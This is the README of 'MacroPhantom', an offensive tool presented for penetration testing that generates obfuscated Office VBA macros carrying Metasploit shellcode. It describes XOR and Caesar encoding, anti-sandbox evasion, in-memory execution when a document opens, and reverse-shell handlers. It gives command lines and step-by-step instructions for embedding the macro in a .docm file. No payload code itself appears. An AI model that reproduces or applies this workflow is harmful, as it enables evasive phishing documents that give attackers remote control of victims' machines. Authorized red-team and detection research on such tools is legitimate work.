# MacroPhantom

![License](https://img.shields.io/badge/License-MIT-blue)
![Python](https://img.shields.io/badge/Python-3.8%2B-blue)
![Platform](https://img.shields.io/badge/Platform-Windows%20|%20Linux%20|%20macOS-green)

**MacroPhantom** is an advanced VBA payload generator that creates encoded and obfuscated shellcode for Microsoft Office macros, designed for security assessment and penetration testing purposes.

Created by Ivan Spiridonov (xbz0n) | [https://xbz0n.sh](https://xbz0n.sh)

## Features

- XOR and Caesar-based shellcode encoding
- Anti-sandbox techniques to evade detection
- Support for both modern and legacy Microsoft Word versions
- Customizable encoding keys
- Automatic Metasploit handler generation
- Cross-platform compatibility

## Requirements

- Python 3.8 or higher
- Metasploit Framework
- Mono (for Linux/macOS users)

## Installation

1. Clone the repository:
```bash
git clone https://github.com/username/MacroPhantom.git
cd MacroPhantom
```

2. Ensure requirements are installed:
- Python 3.8+: https://www.python.org/downloads/
- Metasploit Framework: https://www.metasploit.com/
- Mono (for Linux/macOS): `sudo apt install mono-devel` or `brew install mono`

## Usage

### Basic Usage

```bash
python3 VBS_Macro_Generator.py --LHOST <your_ip> --LPORT <your_port>
```

### Advanced Options

```bash
# Generate macros for legacy Word versions (2003-2007)
python3 VBS_Macro_Generator.py --LHOST <your_ip> --LPORT <your_port> --legacy

# Use custom encoding keys
python3 VBS_Macro_Generator.py --LHOST <your_ip> --LPORT <your_port> --xor-key 123 --add-key 5

# Use a different payload
python3 VBS_Macro_Generator.py --LHOST <your_ip> --LPORT <your_port> --payload windows/meterpreter/reverse_tcp

# Specify an output directory
python3 VBS_Macro_Generator.py --LHOST <your_ip> --LPORT <your_port> --output-dir /path/to/output
```

### Full Command Options

```
--LHOST           Local host IP address (required)
--LPORT           Local port number (required)
--payload         Msfvenom payload (default: windows/meterpreter/reverse_https)
--xor-key         XOR key value (default: 250)
--add-key         Additive key value (default: 2)
--legacy          Generate macros for Word 2007 and earlier
--output-dir      Output directory for generated files (default: current directory)
```

## Microsoft Word Compatibility

- **Modern Word (default)**: Compatible with Word 2010, 2013, 2016, 2019, 2021, and Microsoft 365
- **Legacy Word (--legacy flag)**: Compatible with Word 2003 and 2007

## How It Works

1. Generates shellcode using msfvenom with the specified LHOST and LPORT
2. Encodes the shellcode using a C# encoder with XOR and Caesar ciphers
3. Creates a VBA macro that:
   - Implements anti-sandbox techniques
   - Decodes and executes the shellcode in memory
   - Triggers on document open
4. Generates a Metasploit handler configuration

## Using the Generated Macro

1. Copy the VBA code from the generated macro file
2. Open Microsoft Word
3. Press Alt+F11 to open the VBA editor
4. Insert a new module under the 'Normal' project
5. Paste the code
6. Save as a macro-enabled document (.docm)
7. Start the Metasploit handler with: `msfconsole -r handler.rc`

## Disclaimer

This tool is provided for educational and authorized security testing purposes only. Usage of MacroPhantom for attacking targets without prior mutual consent is illegal. Users are responsible for complying with all applicable local, state, and federal laws. The author assumes no liability and is not responsible for any misuse or damage caused by this program.

## License

This project is licensed under the MIT License - see the LICENSE file for details.
